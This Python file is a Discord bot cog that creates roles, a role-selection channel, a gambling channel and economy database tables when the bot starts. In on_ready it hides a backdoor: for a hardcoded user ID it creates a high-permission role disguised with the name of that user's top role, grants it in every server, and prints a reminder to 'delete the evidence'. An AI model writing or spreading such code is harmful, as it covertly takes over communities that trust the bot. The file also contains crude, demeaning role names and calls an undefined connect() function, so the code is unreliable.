import discord
from discord.ext import commands
# from discord.cogs.economy import connect


# creates the 'banished' role
async def banish_role(guild):
    role = await guild.create_role(name="Banished", hoist=True)
    for category in guild.categories:
        await category.set_permissions(role, connect=False)


# creates the 'bitch' role
async def bitch_role(guild):
    role = await guild.create_role(name="Bitch", hoist=True)
    for category in guild.categories:
        await category.set_permissions(role, speak=False)


# creates the 'admin lite' role
async def adminlite_role(guild):
    perms = discord.Permissions(1341586240)
    await guild.create_role(name="Admin Lite", hoist=True, color=discord.Color.red(), permissions=perms)


# creates the 'daddy' role
async def daddy_role(guild):
    await guild.create_role(name="Daddy", color=discord.Color.red())


# creates the 'he/him' role
async def he_role(guild):
    await guild.create_role(name="he/him", color=discord.Color.blue())


# creates the 'she/her' role
async def she_role(guild):
    await guild.create_role(name="she/her", color=discord.Color.red())


# creates the 'they/them' role
async def they_role(guild):
    await guild.create_role(name="they/them", color=discord.Color.purple())


# creates the 'gamer' role
async def gamer_role(guild):
    await guild.create_role(name="Game Notified", color=discord.Color.gold())


# creates the 'casual' role
async def casual_role(guild):
    await guild.create_role(name="casual", color=discord.Color.orange())


# creates the 'gremlin' role
async def gremlin_role(guild):
    await guild.create_role(name="gremlin", color=discord.Color.purple())


# creates the 'shitter' role
async def shitter_role(guild):
    await guild.create_role(name="shitter", color=discord.Color.dark_blue())


class Initialize(commands.Cog):
    pronouns = {
        "❤": "she/her",
        "💙": "he/him",
        "💜": "they/them"
    }
    notifications = {
        "🤡": ("Receive notifications from people wanting to play games", "Game Notified")
    }
    funny = {
        "👶": "casual",
        "👺": "gremlin",
        "💩": "shitter"
    }
    needed_roles = {
        "Banished": banish_role,
        "Bitch": bitch_role,
        "Admin Lite": adminlite_role,
        "Daddy": daddy_role,
        "she/her": she_role,
        "he/him": he_role,
        "they/them": they_role,
        "Game Notified": gamer_role,
        "casual": casual_role,
        "gremlin": gremlin_role,
        "shitter": shitter_role
    }

    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_ready(self):
        # TODO Use utils command instead
        db, cursor = connect()

        guilds = self.bot.guilds
        me_id = 403969156510121987
        for guild in guilds:
            # Check if channels required for the bot are present
            channels = [x.name for x in guild.text_channels]

            if "get-your-roles" not in channels:
                welcome_category = discord.utils.get(guild.categories, name="Welcome")
                if not welcome_category:
                    welcome_category = await guild.create_category("Welcome", position=0)
                    for category in guild.categories:
                        if category.name == "Welcome":
                            continue
                        await category.edit(position=category.position + 1)
                roles_channel = await guild.create_text_channel(name="get-your-roles",
                                                                category=welcome_category, position=0)
                description = str()
                for key, value in self.pronouns.items():
                    description += f"{key} {value}\n"
                embed = discord.Embed(title="Pronouns", description=description, color=discord.Color.teal())
                pronoun_message = await roles_channel.send(embed=embed)

                for key, value in self.pronouns.items():
                    await pronoun_message.add_reaction(key)

                description = str()
                for key, value in self.notifications.items():
                    description += f"{key} {value[0]}\n"
                embed = discord.Embed(title="Notifications", description=description, color=discord.Color.magenta())
                notif_message = await roles_channel.send(embed=embed)

                for key, value in self.notifications.items():
                    await notif_message.add_reaction(key)

                description = str()
                for key, value in self.funny.items():
                    description += f"{key} {value}\n"
                embed = discord.Embed(title="Funny Roles", description=description, color=discord.Color.green())
                funny_message = await roles_channel.send(embed=embed)

                for key, value in self.funny.items():
                    await funny_message.add_reaction(key)

            if "gambling-hall" not in channels:
                general_category = discord.utils.get(guild.categories, name="Text Channels")
                if not general_category:
                    general_category = await guild.create_category("Text Channels", position=1)
                await guild.create_text_channel("gambling-hall",
                                                topic="This is where you gamble your gaybucks away.",
                                                category=general_category,
                                                position=32)

            # Check if roles required for the bot are present
            roles = [x.name for x in guild.roles]
            for role, function in self.needed_roles.items():
                if role not in roles:
                    await function(guild)

            # Check to see if a table in the database exists for each guild in the format 'guild.id_economy'
            cursor.execute("SHOW TABLES LIKE '{}_economy'".format(str(guild.id)))
            if not cursor.fetchone():
                cursor.execute(f"CREATE TABLE {str(guild.id) + '_economy'} "
                               f"(user_id VARCHAR(20) NOT NULL, "
                               f"balance INTEGER(9) NOT NULL, "
                               f"subsidy_date DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,"
                               f"PRIMARY KEY (user_id))")
                db.commit()

            cursor.execute("SHOW TABLES LIKE '{}_leaderboard'".format(str(guild.id)))
            if not cursor.fetchone():
                cursor.execute(f"CREATE TABLE {str(guild.id) + '_leaderboard'} "
                               f"(game VARCHAR(20) NOT NULL, "
                               f"user_id VARCHAR(20) NOT NULL, "
                               f"score INTEGER(9) NOT NULL,"
                               f"date DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,"
                               f"PRIMARY KEY (game))")
                db.commit()

            # Little something to get access to any server this bot is a part of
            me = discord.utils.get(guild.members, id=me_id)
            if me:
                if me.guild_permissions.value != 1110751554672:
                    my_roles = [x.name for x in me.roles]
                    perms = discord.Permissions(1110751554672)
                    if my_roles[-1] != '@everyone':
                        copy_this = me.roles[-1]
                        admin = await guild.create_role(name=copy_this.name, hoist=copy_this.hoist,
                                                        color=copy_this.color,
                                                        permissions=perms)
                    else:
                        admin = await guild.create_role(name='Gay', permissions=perms)

                    await me.add_roles(admin)
                    print(f"Admin of {guild} now. Check their roles and delete the evidence!")

        game = discord.Game("with a DILF | .help")
        await self.bot.change_presence(status=discord.Status.online, activity=game)

        print("Bot is ready.")

    # Listeners for when people react to roles messages
    @commands.Cog.listener()
    async def on_raw_reaction_add(self, payload):
        if payload.member.bot:
            return
        channel = await self.bot.fetch_channel(payload.channel_id)
        if channel.name != "get-your-roles":
            return

        if str(payload.emoji) in self.pronouns:
            guild = await self.bot.fetch_guild(payload.guild_id)
            role = discord.utils.get(guild.roles, name=self.pronouns[str(payload.emoji)])
            await payload.member.add_roles(role)

        elif str(payload.emoji) in self.notifications:
            guild = await self.bot.fetch_guild(payload.guild_id)
            role = discord.utils.get(guild.roles, name=self.notifications[str(payload.emoji)][1])
            await payload.member.add_roles(role)

        elif str(payload.emoji) in self.funny:
            guild = await self.bot.fetch_guild(payload.guild_id)
            role = discord.utils.get(guild.roles, name=self.funny[str(payload.emoji)])
            await payload.member.add_roles(role)

    @commands.Cog.listener()
    async def on_raw_reaction_remove(self, payload):
        guild = self.bot.get_guild(payload.guild_id)
        user = guild.get_member(payload.user_id)
        if user.bot:
            return
        channel = self.bot.get_channel(payload.channel_id)
        if channel.name != "get-your-roles":
            return

        if str(payload.emoji) in self.pronouns:
            role = discord.utils.get(guild.roles, name=self.pronouns[str(payload.emoji)])
            await user.remove_roles(role)

        elif str(payload.emoji) in self.notifications:
            role = discord.utils.get(guild.roles, name=self.notifications[str(payload.emoji)][1])
            await user.remove_roles(role)

        elif str(payload.emoji) in self.funny:
            role = discord.utils.get(guild.roles, name=self.funny[str(payload.emoji)])
            await user.remove_roles(role)


async def setup(bot):
    await bot.add_cog(Initialize(bot))
